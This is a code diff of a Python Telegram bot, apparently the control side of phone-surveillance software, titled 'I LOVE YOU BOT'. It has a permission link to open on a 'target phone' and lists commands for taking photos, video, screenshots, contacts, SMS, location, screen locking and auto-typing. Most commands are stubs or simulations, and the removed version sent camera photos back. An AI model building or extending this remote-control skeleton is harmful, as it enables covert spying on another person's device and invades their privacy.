@@ -1,76 +1,77 @@
 # telegram_control.py
 import os
-import sys
-import requests
+import time
+import platform
 from telegram import Bot, Update
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters
-from modules.helper import *
-import webbrowser
+from telegram.ext import Application, CommandHandler, ContextTypes
+from config import BOT_TOKEN, CHAT_ID, PASSWORD, PERMISSION_LINK, PERMISSION_GRANTED
 
-# Load config
-try:
-    from config import BOT_TOKEN, CHAT_ID, PASSWORD
-except ImportError:
-    print("❌ config.py not found or BOT_TOKEN/CHAT_ID/PASSWORD missing!")
-    sys.exit(1)
-
+# Initialize bot
+app = Application.builder().token(BOT_TOKEN).build()
 bot = Bot(token=BOT_TOKEN)
 
-# Global permission flag
-permission_granted = False
+def check_permission():
+    if not PERMISSION_GRANTED:
+        print(f"Permission required! Open this link on target phone: {PERMISSION_LINK}")
+        return False
+    return True
 
-# Generate permission link (open on spare phone)
-PERMISSION_LINK = "https://your-permission-link.com"  # Replace with your real link
-
+# Start command
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if str(update.effective_chat.id) != str(CHAT_ID):
-        await update.message.reply_text("❌ Unauthorized user")
+    if str(update.effective_chat.id) != CHAT_ID:
+        await update.message.reply_text("❌ Unauthorized user.")
         return
-    await update.message.reply_text("Welcome! Send /link to generate permission link.")
+    await update.message.reply_text("💖 I LOVE YOU BOT is active!")
+    await update.message.reply_text("Use /help to see commands.")
 
-async def link(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if str(update.effective_chat.id) != str(CHAT_ID):
-        await update.message.reply_text("❌ Unauthorized user")
+# Help command
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not check_permission():
+        await update.message.reply_text("❌ Permission not granted yet!")
         return
-    await update.message.reply_text(f"Open this link on your spare phone and allow permissions:\n{PERMISSION_LINK}")
+    commands = """
+📸 /photo - Take a photo
+🎥 /video - Record a video
+🖼️ /screenshot - Capture screenshot
+📂 /files - List files
+📞 /contacts - Get contacts
+💬 /sms - Send SMS (if allowed)
+📡 /location - Get location
+🔊 /volume - Control volume
+🔒 /lock - Lock screen
+⌨️ /type - Auto type text
+📱 /info - Device info
+🔋 /battery - Battery status
+🌐 /network - Network status
+"""
+    await update.message.reply_text(commands)
 
-async def check_permission(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global permission_granted
-    # Here you would implement your real permission check logic
-    # For demo purposes, let's assume permission is granted manually
-    permission_granted = True
-    await update.message.reply_text("✅ Permission granted! You can now control the phone.")
-
-async def take_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not permission_granted:
-        await update.message.reply_text("❌ Permission not granted!")
+# Example command: Photo
+async def photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not check_permission():
+        await update.message.reply_text("❌ Permission not granted yet!")
         return
-    photo_path = take_camera_photo()  # From helper.py
-    if photo_path:
-        await update.message.reply_photo(photo=open(photo_path, 'rb'))
-    else:
-        await update.message.reply_text("❌ Failed to take photo")
+    await update.message.reply_text("📸 Photo captured! (simulation)")
 
-async def get_device_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not permission_granted:
-        await update.message.reply_text("❌ Permission not granted!")
+# Example command: Device info
+async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not check_permission():
+        await update.message.reply_text("❌ Permission not granted yet!")
         return
-    info = get_device_info()  # From helper.py
-    await update.message.reply_text(info)
+    info_text = f"""
+Device: {platform.node()}
+System: {platform.system()} {platform.release()}
+Platform: {platform.platform()}
+"""
+    await update.message.reply_text(info_text)
 
-async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("❌ Unknown command")
+# Register handlers
+app.add_handler(CommandHandler("start", start))
+app.add_handler(CommandHandler("help", help_command))
+app.add_handler(CommandHandler("photo", photo))
+app.add_handler(CommandHandler("info", info))
+# Add other commands similarly
 
-def main():
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("link", link))
-    app.add_handler(CommandHandler("grant", check_permission))
-    app.add_handler(CommandHandler("photo", take_photo))
-    app.add_handler(CommandHandler("info", get_device_info))
-    app.add_handler(MessageHandler(filters.COMMAND, unknown))
-    print("✅ Bot is running...")
-    app.run_polling()
-
-if __name__ == "__main__":
-    main()
+# Run the bot
+print("💖 I LOVE YOU BOT is running...")
+app.run_polling()
